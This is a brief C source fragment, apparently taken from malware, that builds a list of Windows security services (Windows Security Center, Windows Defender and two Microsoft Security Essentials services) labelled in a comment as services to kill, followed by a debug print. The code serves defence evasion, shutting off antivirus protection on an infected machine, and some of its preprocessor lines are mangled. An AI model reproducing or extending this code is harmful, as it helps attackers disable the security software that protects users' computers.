
 char AVSVC[512]; // services list to kill (also used by ProcessInactiveServices)

 void InitAVSVC()
 {
  // Windows Security Center
  // Windows Defender
  // Microsoft Security Essentials (Microsoft Antimalware Service)
  // Microsoft Security Essentials (Microsoft Network Inspection)
  strcpy(AVSVC,"|wscsvc|WinDefend|MsMpSvc|NisSrv|"); 

  //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef dbgdbg
   adddeb("InitAVSVC: %s",AVSVC);
  //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
 }

